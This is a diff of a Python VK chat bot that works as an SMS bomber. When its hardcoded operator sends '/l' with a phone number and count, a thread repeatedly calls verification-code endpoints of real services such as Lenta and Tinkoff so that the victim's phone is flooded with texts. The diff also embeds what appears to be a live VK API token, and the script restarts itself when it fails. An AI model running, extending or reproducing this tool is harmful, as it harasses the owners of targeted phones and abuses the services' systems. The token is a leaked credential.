@@ -4,6 +4,8 @@ try:
 	from vk_api.utils import get_random_id
 
 
+
+
 	def text1(arg):
 	    return arg.split()[1]
 
@@ -27,11 +29,11 @@ try:
 		masska3 = phone[1:4] + '+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
 		while int(ckok) > o:
 			o += 1
-			try:requests.post("https://lenta.com/api/v1/registration/requestValidationCode", 
-					json={"phone" : "+" + phone}, headers=headers, timeout=5.05)
-			except:pass
+			try:
+				requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers)
+			except:
+				pass
 
-			except:pass
 			try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
 					    data={"phone": "+" + phone}, headers=headers, timeout=5.05)
 			except:pass
@@ -79,7 +81,7 @@ try:
 			except:pass
 
 
-	token = "ab483c22ea3083701535b91c09775f850778eb0cdfc74c0824f08acd700364872"
+	token = "ab483c22ea3083701535b91c09775f8507915943664a874f96aa2978eb0cdfc74c0824f08acd700364872"
 	authorize = vk_api.VkApi(token=token)
 	longpoll = VkLongPoll(authorize)
 	for event in longpoll.listen():
@@ -88,13 +90,13 @@ try:
 			sender = event.user_id
 			if sender == 678105126:
 			    if reseived_message == 'начать':
-			    	write_message(sender, "Работает!")
+				write_message(sender, "Работает!")
 				    # ОТПРАВКА ЗАПРОСТА СЕРЕЗ ПОТОКИ 
 			    elif reseived_message[0:2] == '/l':
-			    	nomer = text1(reseived_message)
-			    	ckok = text2(reseived_message)
-			    	t = threading.Thread(target=spam, args=(nomer, int(ckok * 5), 1, 2))
-			    	t.start()
-			    	write_message(sender, 'Всё ок')
+				nomer = text1(reseived_message)
+				ckok = text2(reseived_message)
+				t = threading.Thread(target=spam, args=(nomer, int(ckok * 5), 1, 2))
+				t.start()
+				write_message(sender, 'Всё ок')
 except:
     os.system('python bot.py')
